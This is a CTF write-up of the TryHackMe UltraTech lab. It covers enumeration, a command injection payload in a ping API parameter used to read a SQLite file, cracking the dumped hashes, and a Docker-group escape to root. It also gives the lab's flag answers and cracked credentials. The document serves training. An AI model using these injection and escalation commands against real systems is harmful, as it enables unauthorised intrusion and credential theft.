---
title: "TryHackMe - UltraTech Write-up"
description: UltraTech is a medium-difficulty grey-box penetration testing room on TryHackMe, inspired by real-world vulnerabilities and misconfigurations.
date: 2025-09-28 00:00:00 +0800
# last_modified_at: 2025-09-28 00:00:00 +0800
categories: [Writeups, TryHackMe]
tags: [TryHackMe,CTF,UltraTech,Penetration Testing,Web App Pentesting,Command Injection,Directory Enumeration,Docker,Privilege Escalation,GTFOBins,Linux,Ffuf]
pin: false
image:
  path: assets/writeups/thm/thm-ultratech/ultratech-banner.png
  #alt: UltraTech room banner
---

Room: [UltraTech](https://tryhackme.com/room/ultratech1)<br>
Author: [lp1](https://tryhackme.com/p/lp1)<br>
Difficulty: <span style="color: #ef9c03"> **Medium** </span>

## Introduction
In the UltraTech room, you're hired by UltraTech to assess the security of their infrastructure. You’re given just the server’s IP and the company’s name, no source code, no full credentials. From there, your mission is to perform reconnaissance, discover and exploit vulnerabilities in web services, access restricted data, and ultimately achieve root. Along the way, you’ll practice enumeration (identifying open ports and web endpoints), attacking a REST API (including command-injection vector), cracking hashes, and abusing Docker misconfigurations to escalate privileges.

## Enumeration
### Nmap
Start by using nmap to identify open ports and services.

```bash
sudo nmap -A -T4 -Pn -p- 10.201.72.139
```

Nmap scan shows `4` open ports. We also got information about what services and version those ports are and the OS of the machine. We now have the following information:

```text
IP: 10.201.72.139
OS: Ubuntu

Ports:
21 - vsftpd 3.0.3
22 - OpenSSH 7.6p1
8081 - Node.js Express framework
31331 - Apache httpd 2.4.29
```

![image.png](/assets/writeups/thm/thm-ultratech/nmap-scan.png)

With those information, we can now answer the first four questions in Task 2.
### Questions
#### Task 2: Question 1 Flag
<details> 
  <summary><b>Which software is using the port 8081?</b></summary>
   Node.js
</details>

#### Task 2: Question 2 Flag
<details> 
  <summary><b>Which other non-standard port is used?</b></summary>
   31331
</details>

#### Task 2: Question 3 Flag
<details> 
  <summary><b>Which software using this port?</b></summary>
   Apache
</details>

#### Task 2: Question 4 Flag
<details> 
  <summary><b>Which GNU/Linux distribution seems to be used?</b></summary>
   Ubuntu
</details>

### Navigating the Websites
#### UltraTech Website (Port 31331)

![image.png](/assets/writeups/thm/thm-ultratech/ultratech-website.png)

#### UltraTech API (Port 8081)

![image.png](/assets/writeups/thm/thm-ultratech/api-page.png)

### Directory Enumeration
#### UltraTech API
To answer the fifth question in Task 2, we need to perform enumeration on the UltraTech API to identify its endpoints. Using `ffuf`, we found the endpoints below which is also the answer to the 5th question. One of the API endpoints will be useful in the next section.

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.201.72.139:8081/FUZZ
```

**Command Breakdown:**
- `ffuf`: This is the tool used to perform directory fuzzing/enumeration
- `-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ`: This will use the wordlist we specify (`directory-list-2.3-medium.txt`) and the `:FUZZ` is the keyword used for fuzzing a certain part of the target URL.
- `-u http://10.201.72.139:8081/FUZZ`: Target URL. This is the url you want to fuzz and the `FUZZ` keyword is a placeholder where the items in the wordlist will be placed.

![image.png](/assets/writeups/thm/thm-ultratech/ffuf-output.png)

#### Task 2: Question 5 Flag
<details> 
  <summary><b>The software using the port 8081 is a REST api, how many of its routes are used by the web application?</b></summary>
   2
</details>
<br>

#### UltraTech Website

Performing directory enumeration on the UltraTech website (Port 31331) yields the following directories.

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.201.72.139:31331/FUZZ
```

```text
css
js
javascript
```

![image.png](/assets/writeups/thm/thm-ultratech/ffuf-output-31331.png)
<br>

## Exploitation
Reading through the contents of the directories/endpoints we found on the UltraTech Website (Port 31331), we found an interesting file called `api.js`. Reading through it we found a function used in the UltraTech API and the parameter for the `ping` endpoint. 

![image.png](/assets/writeups/thm/thm-ultratech/api-js.png)

We can then check the endpoint's functionality. Just as the name implies, the `ping` endpoint uses the ping command that runs on the server.

![image.png](/assets/writeups/thm/thm-ultratech/ping-endpoint.png)

### Command Injection
With this information, we can test if it is vulnerable to Command Injection. **Command Injection** allows us to send commands to the server via the vulnerable application. After some trial and error, we were able to perform a command injection attack by using what is called **Command Substition** as shown in the screenshot below. This tells the interpreter to execute the commands inside the backticks (\`pwd\`) first before the main command is executed, and it uses the output of the command substitution as the input value for the main command, which in this case is the `ping`.

It will look something like this:
```bash
# Initial command with Command Substitution
ping `pwd`

# After Command Substitution
ping /home/www/api
```

![image.png](/assets/writeups/thm/thm-ultratech/command-injection-vuln.png)

Doing more command injection attacks, we found a file called `utech.db.sqlite` by running the `ls` command on the server. This also answers the first question of Task 3.

![image.png](/assets/writeups/thm/thm-ultratech/command-injection-vuln2.png)


#### Task 3: Question 1 Flag
<details> 
  <summary><b>There is a database lying around, what is its filename?</b></summary>
   utech.db.sqlite
</details>
<br>

We tried to view the database's contents by running the `cat` command and we got the following: 

```text
http://10.201.72.139:8081/ping?ip=`cat%20utech.db.sqlite`
```
```text
r00t:f357a0c52799563c7c7b76c1e7543a32
admin:0d0ea5111e3c1def594c1684e3b9be84
```

![image.png](/assets/writeups/thm/thm-ultratech/sqlite-output.png)

#### Task 3: Question 2 Flag
<details> 
  <summary><b>What is the first user's password hash?</b></summary>
   f357a0c52799563c7c7b76c1e7543a32
</details>
<br>

We can try to crack the hash by using an online tool called [CrackStation](https://crackstation.net/).

![image.png](/assets/writeups/thm/thm-ultratech/crackstation.png)

#### Task 3: Question 3 Flag
<details> 
  <summary><b>What is the password associated with this hash?</b></summary>
   n100906
</details>
<br>

## Initial Access

We know that SSH is open, we can leverage the credentials we found to connect to the server.

```bash
ssh r00t@10.201.72.139
```

![image.png](/assets/writeups/thm/thm-ultratech/ssh.png)

## Privilege Escalation

We then need to perform post-compromise enumeration to look for privilege escalation paths. We then found an interesting info after running the `id` command. The account `r00t` is a member of the `docker` group. This tells us that we are inside a docker container.

![image.png](/assets/writeups/thm/thm-ultratech/post-exploit-enum.png)

We then look for the privesc for docker in [GTFOBins](https://gtfobins.github.io/gtfobins/docker/) to escape from the container and gain root permission.

```bash
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

![image.png](/assets/writeups/thm/thm-ultratech/privesc.png)

After gaining root permission, we then need to find the `id_rsa` key to complete our goal.

![image.png](/assets/writeups/thm/thm-ultratech/rsa-key.png)

#### Task 4: Question 1 Flag
<details> 
  <summary><b>What are the first 9 characters of the root user's private SSH key?</b></summary>
   MIIEogIBA
</details>
<br>

Thanks for reading my write-up, I hope you learned something new! Feel free to connect with me if you have any questions. 🙂

## References
ffuf: [https://www.kali.org/tools/ffuf/](https://www.kali.org/tools/ffuf/)

Command Injection: [https://owasp.org/www-community/attacks/Command_Injection](https://owasp.org/www-community/attacks/Command_Injection)

Command Substitution: [https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html](https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html)

Command Substitution (Unix StackExchange): [https://unix.stackexchange.com/questions/27428/what-does-backquote-backtick-mean-in-commands](https://unix.stackexchange.com/questions/27428/what-does-backquote-backtick-mean-in-commands)

CrackStation: [https://crackstation.net/](https://crackstation.net/)

GTFOBins: [https://gtfobins.github.io/](https://gtfobins.github.io/)